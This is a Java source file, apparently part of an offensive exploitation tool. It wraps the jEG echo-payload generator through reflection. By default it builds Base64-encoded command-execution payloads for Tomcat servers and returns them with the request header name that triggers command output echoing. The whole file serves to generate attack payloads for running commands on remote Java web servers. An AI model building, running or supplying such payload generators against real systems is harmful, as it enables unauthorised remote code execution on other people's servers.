package com.summersec.attack.integration.generator;

import com.summersec.attack.integration.generator.model.EchoGenerateRequest;
import com.summersec.attack.integration.generator.model.EchoGenerateResult;

import java.lang.reflect.Method;

public class JegEchoGeneratorAdapter implements EchoGeneratorAdapter {
    @Override
    public EchoGenerateResult generate(EchoGenerateRequest request) {
        try {
            Class<?> constantsClass = resolveClass(
                "jeg.common.Constants",
                "jeg.core.config.Constants"
            );
            Class<?> configClass = resolveClass(
                "jeg.core.config.jEGConfig",
                "jeg.core.jEGConfig"
            );
            Class<?> generatorClass = resolveClass(
                "jeg.core.jEGenerator",
                "jeg.core.generator.jEGenerator"
            );

            Object config = configClass.newInstance();
            invokeSetter(configClass, config, "setServerType", constantsClass, valueOrDefault(request.getServerType(), "SERVER_TOMCAT"));
            invokeSetter(configClass, config, "setModelType", constantsClass, valueOrDefault(request.getModelType(), "MODEL_CMD"));
            invokeSetter(configClass, config, "setFormatType", constantsClass, valueOrDefault(request.getFormatType(), "FORMAT_BASE64"));
            configClass.getMethod("build").invoke(config);

            Object generator = generatorClass.getConstructor(configClass).newInstance(config);
            String payload = String.valueOf(generatorClass.getMethod("getPayload").invoke(generator));
            String headerName = String.valueOf(configClass.getMethod("getReqHeaderName").invoke(config));
            return EchoGenerateResult.ok("jEG", payload, headerName);
        } catch (Exception e) {
            return EchoGenerateResult.fail("jEG", e.getMessage());
        }
    }

    private static Class<?> resolveClass(String... names) throws ClassNotFoundException {
        for (String name : names) {
            try {
                return Class.forName(name);
            } catch (ClassNotFoundException ignored) {
            }
        }
        throw new ClassNotFoundException("无法定位 jEG API 类");
    }

    private static String valueOrDefault(String value, String fallback) {
        return value == null || value.trim().isEmpty() ? fallback : value.trim();
    }

    private static void invokeSetter(Class<?> configClass, Object config, String methodName, Class<?> constantsClass, String fieldName) throws Exception {
        Method setter = configClass.getMethod(methodName, String.class);
        String constantValue = String.valueOf(constantsClass.getField(fieldName).get(null));
        setter.invoke(config, constantValue);
    }
}
